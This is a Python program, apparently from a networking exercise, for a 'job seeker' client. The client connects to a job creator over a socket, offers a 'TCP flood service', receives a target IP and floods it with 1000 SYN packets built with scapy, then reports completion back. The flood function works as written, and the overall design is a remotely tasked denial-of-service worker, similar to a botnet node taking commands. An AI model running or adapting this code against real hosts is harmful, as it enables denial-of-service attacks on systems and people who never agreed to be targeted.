"""
One-To-Many #2:

The job creator ask more than one job seeker to execute a TCP flood attack (any TCP floodattack) against a given port on a given IP.
"""

import socket
import os
from scapy.all import IP, TCP, send, RandShort

def tcpflood(target):
    for x in range(0, 1000): # sends 1000 packets as a 'flood'. An actual flood would just keep go inifinitly until it was told to stop.
        send(IP(dst=target)/TCP(flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort()), verbose=0)

def seeker_program():
    host = socket.gethostname()  # as both code is running on same pc
    hostip = socket.gethostbyname(host) # gets the ip address
    ip_uid = str(hostip) + ";" + str(os.getpid())
    port = 5000  # socket server port number

    client_socket = socket.socket()  # instantiate
    client_socket.connect((host, port))  # connect to the server

    print("job_seeker: My IP;UID is " + ip_uid)
    client_socket.send(ip_uid.encode()) # send ip
    data = client_socket.recv(1024).decode()    # receive ip
    print("job_creator: My IP;UID is " + str(data))  # show in terminal

    service = bytes([2])
    print("job_seeker: I am offering TCP flood service")
    client_socket.send(service)    # send service/skill
    data = int.from_bytes(client_socket.recv(1), "big")    # receive job or no job available
    if data == 1:
        print("job_creator: I have corresponding job " + str(int.from_bytes(service, "big")) )

# send back accept or deny response
        print("job_seeker: I accept " + str(int.from_bytes(service, "big")) + " job")
        client_socket.send(bytes([1]))

# RECEIVE JOB DATA
        data = client_socket.recv(1024).decode()
        job_data = data # this would later be saved and used
        print("job_creator: Job data sent\n")

        client_socket.close()  # close the connection

        print("job data: " + data + '\n')
        tcpflood(data) # job data is processing

# reconnecting to give result
        client_socket = socket.socket()  # instantiate
        client_socket.connect((host, port))  # connect to the server

        print("job_seeker: My IP;UID is " + ip_uid)
        client_socket.send(ip_uid.encode()) # send ip

        data = client_socket.recv(1024).decode()    # creator ip
        print("job_creator: My IP;UID is " + data + " waiting for return status of job")

        print("job_seeker: Job completed with code 0")
        client_socket.send(bytes([0]))

        print("job_seeker: Sending result data\n")
        client_socket.send((str(job_data) + " flooded with 1000 TCP SYN packets.").encode()) # sending result
    else:
        print("job_creator: I do not have corresponding job " + str(int.from_bytes(service, "big")))
        client_socket.close()  # close the connection



if __name__ == '__main__':
    seeker_program()
